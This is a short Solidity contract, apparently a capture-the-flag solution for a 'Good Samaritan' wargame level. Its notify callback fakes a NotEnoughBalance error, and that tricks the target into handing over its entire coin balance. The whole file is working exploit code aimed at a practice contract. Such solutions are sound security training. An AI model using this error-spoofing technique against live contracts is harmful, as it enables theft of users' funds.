// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {GoodSamaritan, Coin} from "./GoodSamaritan.sol";

contract GoodSamaritanHack {
    error AttackFailed();
    error NotEnoughBalance();

    GoodSamaritan private immutable TARGET;
    Coin private immutable COIN;

    constructor(address _target) {
        TARGET = GoodSamaritan(_target);
        COIN = Coin(TARGET.coin());
    }

    function attack() external {
        TARGET.requestDonation();
        if (COIN.balances(address(this)) != 10 ** 6) revert AttackFailed();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
